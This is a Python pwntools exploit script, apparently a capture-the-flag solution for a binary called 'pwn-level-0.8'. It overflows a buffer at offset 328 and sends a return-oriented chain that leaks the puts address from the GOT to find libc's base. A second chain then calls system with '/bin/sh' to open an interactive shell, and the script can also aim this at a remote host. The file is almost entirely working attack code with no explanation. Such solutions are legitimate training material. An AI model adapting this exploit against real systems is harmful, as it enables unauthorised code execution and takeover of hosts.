from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b *scream+238
continue
""".format(**locals())

exe = "./pwn-level-0.8"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()

# libc = elf.libc
libc = ELF("./libc6_2.36-9_amd64.so", checksec=False)
offset = 328

pop_rsi = 0x401210
ret = 0x401016
mov_rdi_rsi = 0x401205

payload = flat(
    {
        offset: [
            pop_rsi + 1,
            pop_rsi,
            elf.got.puts,
            mov_rdi_rsi,
            elf.plt.puts,
            elf.sym["main"],
        ]
    }
)

io.sendlineafter(b">> ", b"3")
io.sendlineafter(b"screamed: ", payload)

io.recvline()
io.recvline()

leak = unpack(io.recvline()[:-1].ljust(8, b"\x00"))
log.info(f"GOT Puts leak: {hex(leak)}")
libc.address = leak - libc.sym["puts"]
log.info(f"LIBC Base: {hex(libc.address)}")

payload = flat(
    {
        offset: [
            # ret,
            pop_rsi,
            next(libc.search(b"/bin/sh\x00")),
            mov_rdi_rsi,
            libc.sym["system"],
        ]
    }
)

io.sendlineafter(b">> ", b"3")
io.sendlineafter(b"screamed: ", payload)

io.interactive()
